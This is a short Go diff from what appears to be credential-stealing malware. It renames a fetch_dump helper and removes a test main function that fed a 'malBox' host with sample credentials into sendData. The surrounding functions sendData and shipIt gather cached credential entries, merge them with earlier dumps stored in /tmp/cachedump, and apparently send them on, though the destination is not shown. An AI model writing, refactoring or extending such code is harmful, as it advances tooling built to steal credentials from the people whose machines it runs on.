@@ -23,7 +23,7 @@ func sendData(c cred_cache.CredCache) {
 	path := "/tmp/cachedump"
 	h := c.Get_hostname()
 	creds := c.Get_entries()
-	previous_dump := fetch_dump(path)
+	previous_dump := fetchDump(path)
 	if previous_dump != nil {
 		for _, c := range previous_dump {
 			creds = append(creds, c)
@@ -84,13 +84,4 @@ func shipIt(c cred_cache.CredCache, min int) {
 	}
 	sendData(c)
 	return
-}
-
-// For testing only
-func main() {
-	c := cred_cache.CredCache{
-		Hostname:    "malBox",
-		Credentials: []string{"jim:letmein", "dragon:hunter2"},
-	}
-	sendData(c)
 }
